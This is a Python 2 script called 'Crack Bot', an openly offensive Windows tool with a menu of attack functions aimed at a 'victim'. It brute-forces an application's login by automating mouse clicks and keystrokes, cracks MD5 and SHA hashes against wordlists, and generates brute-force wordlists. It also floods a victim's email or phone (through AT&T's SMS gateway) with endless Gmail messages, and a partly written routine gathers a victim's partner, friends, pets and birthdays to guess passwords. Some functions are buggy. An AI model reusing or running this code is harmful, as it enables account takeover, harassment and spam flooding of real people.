"""
Crack Bot
Code by: PFC Cameron, James M
Reference:https://code.tutsplus.com/tutorials/how-to-build-a-python-bot-that-can-play-web-games--active-11117
Reference:https://msdn.microsoft.com/en-us/library/dd375731
Reference:https://en.wikipedia.org/wiki/List_of_SMS_gateways
Reference:https://www.google.com/settings/security/lesssecureapps
Reference:http://stackoverflow.com/questions/7396849/convert-binary-to-ascii-and-vice-versa
<md5>password:5f4dcc3b5aa765d61d8327deb882cf99
Known Errors:
			Add XOR(Type 7) Encryption to func list
			Smart wordlist hasn't been added to six()
			Add func to tell when screen changes for app brute
			Add func to change carrier on five()
"""

import binascii
import hashlib
import os
import smtplib
import sys
import time
import win32api
import win32com.client
import win32con

alphaL = "abcdefghijklmnopqrstuvwxyz"
alphaU = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
num = "0123456789"
random_char = "!@#$%&*"
keychars = alphaL+alphaU+num+random_char
trace = 0
email = ""
passwd = ""
victim_email = ""
number = ""
wordlist_list = []
x_coordinates = []
y_coordinates = []

def app_crack_2():
	global trace
	shell = win32com.client.Dispatch("WScript.Shell")
	for i in range(10):
		leftClick(x_coordinates[0],y_coordinates[0])
		shell.SendKeys(wordlist_list[trace])
		trace += 1
		leftClick(x_coordinates[1],y_coordinates[1])
		leftClick(x_coordinates[2],y_coordinates[2])
		leftClick(x_coordinates[3],y_coordinates[3])
	time.sleep(61)
	app_crack_2()

def brute_words(length):
	print "[*]Generating brute list"
	wordlist = "brute_" + str(length) + ".txt"
	print "[*]Writing to: " + wordlist
	path_to_list = os.path.abspath(wordlist)
	wordlist = open(wordlist,"w+")
	if int(length) == 1:
		for i in keychars:
			wordlist.write(i + "\n")
	elif int(length) == 2:
		for a in keychars:
			for b in keychars:
				wordlist.write(a + b + "\n")
	elif int(length) == 3:
		for a in keychars:
			for b in keychars:
				for c in keychars:
					wordlist.write(a + b + c + "\n")
	elif int(length) == 4:
		for a in keychars:
			for b in keychars:
				for c in keychars:
					for d in keychars:
						wordlist.write(a + b + c + d + "\n")
	elif int(length) == 5:
		for a in keychars:
			for b in keychars:
				for c in keychars:
					for d in keychars:
						for e in keychars:
							wordlist.write(a + b + c + d + e + "\n")
	elif int(length) == 6:
		for a in keychars:
			for b in keychars:
				for c in keychars:
					for d in keychars:
						for e in keychars:
							for f in keychars:
								wordlist.write(a + b + c + d + e + f + "\n")
	elif int(length) == 7:
		for a in keychars:
			for b in keychars:
				for c in keychars:
					for d in keychars:
						for e in keychars:
							for f in keychars:
								for g in keychars:
									wordlist.write(a + b + c + d + e + f + g + "\n")
	elif int(length) == 8:
		for a in keychars:
			for b in keychars:
				for c in keychars:
					for d in keychars:
						for e in keychars:
							for f in keychars:
								for g in keychars:
									for h in keychars:
										wordlist.write(a + b + c + d + e + f + g + h + "\n")
	else:
		print "[-]Exceeded max brute length"
		print "   Max length == 8"
		os.system("pause")
		main()
	print "[+]Finished"
	os.system("pause")
	main()

def smart_wordlist():
	global wordlist_list
	basic_wordlist = "password dog wiz whiz"
	basic_wordlist = basic_wordlist.split(" ")
	try:
		print "Enter victims name"
		wordlist.append(raw_input("> "))
		print "Enter victims girlfriend/wife"
		wordlist.append(raw_input("> "))
		print "Enter number of close friends victim has"
		num = input("> ")
		for i in range(num):
			print "Enter friend " + str(i) + "name"
			wordlist.append(raw_input("> "))
		print "Enter number of pets victim has"
		num = input("> ")
		for i in range(num):
			print "Enter pet " + str(i) + "name"
			wordlist.append(raw_input("> "))
		print "Enter number of games victim likes"
		num = input("> ")
		for i in range(num):
			print "Enter game " + str(i) + "name"
			wordlist.append(raw_input("> "))
		print "Enter number of important numbers <birthdays, pins, etc>"
		num = input("> ")
		for i in range(num):
			print "Enter friend " + str(i) + "name"
			wordlist.append(raw_input("> "))
	except Exception, e:
		print "[-]Error: " + str(e)
		os.system("pause")
		main()
	
def get_mouse_pos():
	global x_coordinates
	global y_coordinates
	x,y = win32api.GetCursorPos()
	x_coordinates.append(x)
	y_coordinates.append(y)

def leftClick(x,y):
	win32api.SetCursorPos((x,y))
	win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN,x,y,0,0)
	time.sleep(1)
	win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP,x,y,0,0)
	time.sleep(1)
	
def md5(wordlist,crypt_pass,salt):
	os.system("cls")
	wordlist = open(wordlist)
	for word in wordlist.readlines():
		word = word.strip("\n")
		if salt == "":
			word = word
		else:
			word = word + str(salt)
		print "[*]Trying: " + word
		test_pass = hashlib.md5(word).hexdigest()
		if str(test_pass) == str(crypt_pass):
			print "[+]Password Found: " + word
			os.system("pause")
			main()
		else:
			print "[-]Nope: " + word
	print "[+]Finished"
	os.system("pause")
	main()
	
def sha1(wordlist,crypt_pass,salt):
	os.system("cls")
	wordlist = open(wordlist)
	for word in wordlist.readlines():
		word = word.strip("\n")
		if salt == "":
			word = word
		else:
			word = word + str(salt)
		print "[*]Trying: " + word
		test_pass = hashlib.sha1(word).hexdigest()
		if str(test_pass) == str(crypt_pass):
			print "[+]Password Found: " + word
			os.system("pause")
			main()
		else:
			print "[-]Nope: " + word
	print "[+]Finished"
	os.system("pause")
	main()
	
def sha224(wordlist,crypt_pass,salt):
	os.system("cls")
	wordlist = open(wordlist)
	for word in wordlist.readlines():
		word = word.strip("\n")
		if salt == "":
			word = word
		else:
			word = word + str(salt)
		print "[*]Trying: " + word
		test_pass = hashlib.sha224(word).hexdigest()
		if str(test_pass) == str(crypt_pass):
			print "[+]Password Found: " + word
			os.system("pause")
			main()
		else:
			print "[-]Nope: " + word
	print "[+]Finished"
	os.system("pause")
	main()
	
def sha256(wordlist,crypt_pass,salt):
	os.system("cls")
	wordlist = open(wordlist)
	for word in wordlist.readlines():
		word = word.strip("\n")
		if salt == "":
			word = word
		else:
			word = word + str(salt)
		print "[*]Trying: " + word
		test_pass = hashlib.sha256(word).hexdigest()
		if str(test_pass) == str(crypt_pass):
			print "[+]Password Found: " + word
			os.system("pause")
			main()
		else:
			print "[-]Nope: " + word
	print "[+]Finished"
	os.system("pause")
	main()
	
def sha384(wordlist,crypt_pass,salt):
	os.system("cls")
	wordlist = open(wordlist)
	for word in wordlist.readlines():
		word = word.strip("\n")
		if salt == "":
			word = word
		else:
			word = word + str(salt)
		print "[*]Trying: " + word
		test_pass = hashlib.sha384(word).hexdigest()
		if str(test_pass) == str(crypt_pass):
			print "[+]Password Found: " + word
			os.system("pause")
			main()
		else:
			print "[-]Nope: " + word
	print "[+]Finished"
	os.system("pause")
	main()
	
def sha512(wordlist,crypt_pass,salt):
	os.system("cls")
	wordlist = open(wordlist)
	for word in wordlist.readlines():
		word = word.strip("\n")
		if salt == "":
			word = word
		else:
			word = word + str(salt)
		print "[*]Trying: " + word
		test_pass = hashlib.sha512(word).hexdigest()
		if str(test_pass) == str(crypt_pass):
			print "[+]Password Found: " + word
			os.system("pause")
			main()
		else:
			print "[-]Nope: " + word
	print "[+]Finished"
	os.system("pause")
	main()
	
def xor(key,crypt_pass):
#bin(int(binascii.hexlify('hello'), 16))
#n = int('0b110100001100101011011000110110001101111', 2)
#binascii.unhexlify('%x' % n)
	global trace
	ans = ""
	key = key * 15
	bin_key = bin(int(binascii.hexlify(key), 16))
	bin_crypt_pass = list(crypt_pass)
	bin_key = list(bin_key)
	bin_crypt_pass[1] = 7
	bin_key[1] = 7
	while trace < len(bin_crypt_pass):
		tmp_ans = int(bin_crypt_pass[trace]) ^ int(bin_key[trace])
		ans += str(tmp_ans)
		trace += 1
	ans = list(ans)
	ans[1] = "b"
	ans = ''.join(ans)
	print "[+]Finished: " + str(ans)
	os.system("pause")
	
def one():
#Crack Application Password
	os.system("cls")
	global x_coordinates
	global y_coordinates
	global trace
	global wordlist_list
	try:
		print "Defaults set:"
		print "		1 Click"
		print "		Attempt word"
		print "		3 Clicks"
		print "		Repeated 10x"
		print "		1 Minute pause"
		print ""
		os.system("pause")
		for i in range(4):
			print "Place mouse over " + str(i + 1) + " click, then hit enter"
			os.system("pause")
			get_mouse_pos()
		print "Enter path to wordlist"
		wordlist = raw_input("> ")
		wordlist = open(wordlist)
		print "[*]Ready"
		os.system("pause")
		for word in wordlist.readlines():
			word = word.strip("\n")
			wordlist_list.append(word)
		app_crack_2()
	except KeyboardInterrupt:
		print "[+]Finished"
		os.system("pause")
		x_coordinates = []
		y_coordinates = []
		main()
	except Exception, e:
		print "[-]Error: " + str(e)
		os.system("pause")
		main()
	
def two():
#Crack Encrypted/Hashed Password
#Finished
	os.system("cls")
	salt = ""
	menu = '''
	      #############################
	      #       Crack Bot   v_1.0   #
	      #############################
	
			Password Cracker
	
	1) MD5
	2) SHA1
	3) SHA224
	4) SHA256
	5) SHA384
	6) SHA512
	7) XOR <Functionality Coming Soon!>
	8) Main Menu
	''' 
	try:
		print menu
		hash_type = input("> ")
		if hash_type == 1:
			print "Enter path to wordlist"
			wordlist = raw_input("> ")
			print "Enter encrypted/hashed password"
			crypt_pass = raw_input("> ")
			print "Enter salt <optional>"
			salt = raw_input("> ")
			print "[*]Cracking MD5 Password"
			os.system("pause")
			md5(wordlist,crypt_pass,salt)
		elif hash_type == 2:
			print "Enter path to wordlist"
			wordlist = raw_input("> ")
			print "Enter encrypted/hashed password"
			crypt_pass = raw_input("> ")
			print "Enter salt <optional>"
			salt = raw_input("> ")
			print "[*]Cracking SHA1 Password"
			os.system("pause")
			sha1(wordlist,crypt_pass,salt)
		elif hash_type == 3:
			print "Enter path to wordlist"
			wordlist = raw_input("> ")
			print "Enter encrypted/hashed password"
			crypt_pass = raw_input("> ")
			print "Enter salt <optional>"
			salt = raw_input("> ")
			print "[*]Cracking SHA224 Password"
			os.system("pause")
			sha224(wordlist,crypt_pass,salt)
		elif hash_type == 4:
			print "Enter path to wordlist"
			wordlist = raw_input("> ")
			print "Enter encrypted/hashed password"
			crypt_pass = raw_input("> ")
			print "Enter salt <optional>"
			salt = raw_input("> ")
			print "[*]Cracking SHA256 Password"
			os.system("pause")
			sha256(wordlist,crypt_pass,salt)
		elif hash_type == 5:
			print "Enter path to wordlist"
			wordlist = raw_input("> ")
			print "Enter encrypted/hashed password"
			crypt_pass = raw_input("> ")
			print "Enter salt <optional>"
			salt = raw_input("> ")
			print "[*]Cracking SHA384 Password"
			os.system("pause")
			sha384(wordlist,crypt_pass,salt)
		elif hash_type == 6:
			print "Enter path to wordlist"
			wordlist = raw_input("> ")
			print "Enter encrypted/hashed password"
			crypt_pass = raw_input("> ")
			print "Enter salt <optional>"
			salt = raw_input("> ")
			print "[*]Cracking SHA512 Password"
			os.system("pause")
			sha512(wordlist,crypt_pass,salt)
		elif hash_type == 7:
			print "Enter key"
			key = raw_input("> ")
			xor(crypt_pass,key)
		elif hash_type == 8:
			main()
		else:
			print "[-]Unknown Option"
			print "   Starting Over"
			os.system("pause")
			two()
	except KeyboardInterrupt:
		print "[+]Finished"
		os.system("pause")
		main()
	except Exception, e:
		print "[-]Error: " + str(e)
		os.system("pause")
		main()
		
	
def three():
	os.system("cls")
#Email Spam
	menu = '''
	      #############################
	      #       Crack Bot   v_1.0   #
	      #############################
	
			Email Spammer
			
	Note: Gmail settings might need to be altered to allow program access
	Reference: https://www.google.com/settings/security/lesssecureapps
	
	1) Calibrate
	2) Run
	3) Main Menu
	'''
	global email
	global passwd
	global victim_email
	try:
		print menu
		what_you_do = input("> ")
		if what_you_do == 1:
			print "Enter email address <your gmail>"
			email = raw_input("> ")
			print "Enter password <your gmail>"
			passwd = raw_input("> ")
			print "Enter email address <victim email>"
			victim_email = raw_input("> ")
			three()
		elif what_you_do == 2:
			server = smtplib.SMTP("smtp.gmail.com",587)
			server.starttls()
			server.login(email,passwd)
			print "	1) Msg <message to spam victim with>"
			print "	2) Wordlist <list of messages to cycle through>"
			what_you_do = input("> ")
			if what_you_do == 1:
				print "Enter message"
				msg = raw_input("> ")
				print "[*]Ready"
				os.system("pause")
				while True:
					server.sendmail(email,victim_email,msg)
			elif what_you_do == 2:
				print "Enter path to wordlist"
				wordlist = raw_input("> ")
				wordlist = open(wordlist,"r")
				for line in wordlist.readlines():
					msg = line.strip("\n")
					server.sendmail(email,victim_email,msg)
				print "[+]Finished"
				os.system("pause")
				main()
			else:
				print "[-]Unknown Option"
				print "   Starting Over"
				five()
		elif what_you_do == 3:
			main()
		else:
				print "[-]Unknown Option"
				print "   Starting Over"
				five()
	except KeyboardInterrupt:
		print "[+]Finished"
		os.system("pause")
		main()
	except Exception, e:
		print "[-]Error: " + str(e)
		os.system("pause")
		main()
	
	
def four():
#Message Spam
#Finished
	os.system("cls")
	menu = '''
	      #############################
	      #       Crack Bot   v_1.0   #
	      #############################
	
			Message Spammer
	
	1) Msg <Message to spam victim with>
	2) Wordlist <list of messages to cycle through>
	3) Main Menu
	''' 
	global x_coordinates
	global y_coordinates
	shell = win32com.client.Dispatch("WScript.Shell")
	try:
		print menu
		what_you_do = input("> ")
		if what_you_do == 1:
			print "Place cursor over message box, then press enter"
			os.system("pause")
			get_mouse_pos()
			print "Enter message"
			msg = raw_input("> ")
			print "[*]Ready"
			os.system("pause")
			while True:
				#code to click and spam
				leftClick(x_coordinates[0],y_coordinates[0])
				shell.SendKeys(msg)
				time.sleep(1)
				win32api.keybd_event(0x0D, 0,0,0)	#Enter Key
				time.sleep(1)
		elif what_you_do == 2:
			print "Place cursor over message box, then press enter"
			os.system("pause")
			get_mouse_pos()
			print "Enter path to wordlist"
			wordlist = raw_input("> ")
			wordlist = open(wordlist,"r")
			for line in wordlist.readlines():
				msg = line.strip("\n")
				#code to click and spam
				leftClick(x_coordinates[0],y_coordinates[0])
				shell.SendKeys(msg)
				time.sleep(1)
				win32api.keybd_event(0x0D, 0,0,0)	#Enter Key
				time.sleep(1)
			print "[+]Finished"
			os.system("pause")
			x_coordinates = []
			y_coordinates = []
			main()
		elif what_you_do == 3:
			main()
		else:
			print "[-]Unknown Option"
			print "   Starting Over"
			os.system("pause")
			four()
	except KeyboardInterrupt:
		print "[+]Finished"
		os.system("pause")
		x_coordinates = []
		y_coordinates = []
		main()
	except Exception, e:
		print "[-]Error: " + str(e)
		os.system("pause")
		main()
	
def five():
#Text Spam
#Finished
	os.system("cls")
	menu = '''
	      #############################
	      #       Crack Bot   v_1.0   #
	      #############################
	
			Text Spammer
			
	Note: Gmail settings might need to be altered to allow program access
	Note: Cell phone Carrier set to AT&T
	Reference: https://www.google.com/settings/security/lesssecureapps
	Reference: https://en.wikipedia.org/wiki/List_of_SMS_gateways
	
	1) Calibrate
	2) Run
	3) Main Menu
	'''
	global email
	global passwd
	global victim_email
	global number
	try:
		print menu
		what_you_do = input("> ")
		if what_you_do == 2:
			server = smtplib.SMTP("smtp.gmail.com",587)
			server.starttls()
			server.login(email,passwd)
			print "	1) Msg <message to spam victim with>"
			print "	2) Wordlist <list of messages to cycle through>"
			what_you_do = input("> ")
			if what_you_do == 1:
				print "Enter message"
				msg = raw_input("> ")
				print "[*]Ready"
				os.system("pause")
				while True:
					server.sendmail(email,number+"@txt.att.net",msg)
			elif what_you_do == 2:
				print "Enter path to wordlist"
				wordlist = raw_input("> ")
				wordlist = open(wordlist,"r")
				for line in wordlist.readlines():
					msg = line.strip("\n")
					server.sendmail(email,number+"@txt.att.net",msg)
				print "[+]Finished"
				os.system("pause")
				main()
			else:
				print "[-]Unknown Option"
				print "   Starting Over"
				five()
		elif what_you_do == 1:
			print "Enter email address <your gmail>"
			email = raw_input("> ")
			print "Enter password <your gmail>"
			passwd = raw_input("> ")
			print "Enter phone number <victim number>"
			number = raw_input("> ")
			five()
		elif what_you_do == 3:
			main()
		else:
			print "[-]Unknown Option"
			print "   Starting Over"
			os.system("pause")
			five()
	except KeyboardInterrupt:
		print "[+]Finished"
		os.system("pause")
		main()
	except Exception, e:
		print "[-]Error: " + str(e)
		os.system("pause")
		main()
				
	
def six():
#Wordlist Generator
#Working on
	os.system("cls")
	menu = '''
	      #############################
	      #       Crack Bot   v_1.0   #
	      #############################
	
			Wordlist Generator
			
	Note: Smart wordlist functionality coming soon!
	
	1) Brute Force List <Len <= 8>
	2) Brute Force List <All Len>
	3) Main Menu
	'''
	try:
		print menu
		what_you_do = input("> ")
		if what_you_do == 1:
			print "Enter wordlist length"
			length = input("> ")
			brute_words(length)
		elif what_you_do == 2:
			for i in xrange(1,9):
				brute_words(i)
		elif what_you_do == 3:
			main()
	except KeyboardInterrupt:
		print "[+]Finished"
		os.system("pause")
		main()
	except Exception, e:
		print "[-]Error: " + str(e)
		os.system("pause")
		main()

def seven():
	os.system("cls")
#Click Bot
#Finished
	global x_coordinates
	global y_coordinates
	trace = 0
	x_coordinates = []
	y_coordinates = []
	try:
		print "calibrating..."
		print "How many Clicks?"
		clicks = input("> ")
		for i in range(clicks):
			print "Place mouse over " + str((i+1)) + " click"
			os.system("pause")
			get_mouse_pos()
		while trace < len(x_coordinates):
			leftClick(x_coordinates[trace],y_coordinates[trace])
			trace += 1
		print "[+]Finished"
		os.system("pause")
		main()
	except Exception, e:
		print "[-]Error: " + str(e)
		os.system("pause")
		main()
		
def exit_func():
#Exit Function
	global running
	print "Good-bye!"
	os.system("pause")
	sys.exit(0)
	
def main():
	global trace
	global wordlist_list
	global x_coordinates
	global y_coordinates
	global email
	global passwd
	global victim_email
	global number
	trace = 0
	email = ""
	passwd = ""
	victim_email = ""
	number = ""
	wordlist_list = []
	x_coordinates = []
	y_coordinates = []
	menu = '''
	      #############################
	      #       Crack Bot   v_1.0   #
	      #############################
	
			Main Menu
	
	1) Crack Application Password
	2) Crack Encrypted/Hashed Password
	3) Email Spam
	4) Message Spam
	5) Text Spam
	6) Wordlist Generator
	7) Generic Bot
	8) Exit
	'''
	while True:
		try:
			os.system("cls")
			print menu
			what_you_do = input("> ")
			if what_you_do == 1:
				one()
			elif what_you_do == 2:
				two()
			elif what_you_do == 3:
				three()
			elif what_you_do == 4:
				four()
			elif what_you_do == 5:
				five()
			elif what_you_do == 6:
				six()
			elif what_you_do == 7:
				seven()
			elif what_you_do == 8:
				exit_func()
			else:
				print "[-]Unknown Option"
				print "   Starting Over"
				os.system("pause")
				main()
		except Exception, e:
			print "[-]Error: " + str(e)
			os.system("pause")
			main()

if __name__=="__main__":
	main()